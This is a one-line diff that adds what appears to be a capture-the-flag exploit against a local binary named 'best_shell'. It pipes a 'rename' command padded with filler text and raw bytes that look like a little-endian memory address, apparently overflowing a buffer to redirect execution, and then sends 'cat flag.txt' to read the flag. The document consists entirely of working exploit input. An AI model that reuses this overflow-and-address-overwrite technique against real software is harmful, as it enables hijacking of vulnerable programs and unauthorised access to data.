@@ -1,0 +1,1 @@
+{ sleep 1; printf "rename lol a---b---c---d---e---f---g---h---\xd7\x89\x04\x08\n"; sleep 1; printf "a---b---c---d---e---f---g---h---\xd7\x89\x04\x08\n"; sleep 1; echo "cat flag.txt"; }  | ./best_shell
